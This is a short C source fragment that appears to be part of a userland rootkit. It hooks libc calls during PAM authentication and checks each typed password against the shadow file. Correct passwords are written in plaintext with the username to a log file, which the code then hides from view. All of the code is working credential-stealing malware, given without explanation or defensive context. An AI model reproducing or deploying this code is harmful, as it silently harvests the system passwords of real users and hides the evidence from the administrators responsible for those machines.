int verify_pass(char *user, char *resp){
    struct spwd *ent;
    char *pass;
    int got_pw;

    hook(CGETSPNAM);
    ent = call(CGETSPNAM, user);
    if(ent == NULL || strlen(ent->sp_pwdp) < 2)
        return 0;

    pass = crypt(resp, ent->sp_pwdp);
    if(pass == NULL) return 0;

    got_pw = !strcmp(pass, ent->sp_pwdp);
    if(got_pw) return 1;

    return 0;
}

int alreadylogged(char *user, char *resp){
    FILE *fp;
    char line[LINE_MAX], logline[strlen(user)+strlen(resp)+32];
    int logged = 0;
    snprintf(logline, sizeof(logline), LOG_FMT, user, resp);

    hook(CFOPEN);

    fp = call(CFOPEN, LOG_PATH, "r");
    if(fp == NULL) return logged;

    while(fgets(line, sizeof(line), fp) != NULL){
        if(!strcmp(line, logline)){
            logged = 1;
            break;
        }
    }

    fclose(fp);
    return logged;
}

void log_auth(pam_handle_t *pamh, char *resp){
    char *user;
    int  got_pw;
    FILE *fp;

    user = get_username(pamh);
    if(user == NULL) return;

    got_pw = verify_pass(user, resp);
    if(!got_pw) return;
    if(alreadylogged(user, resp)) return;

    hook(CFOPEN);
    fp = call(CFOPEN, LOG_PATH, "a");
    if(fp == NULL) return;

    fprintf(fp, LOG_FMT, user, resp);
    fclose(fp);

    if(!hidden_path(LOG_PATH))
        hide_path(LOG_PATH);
}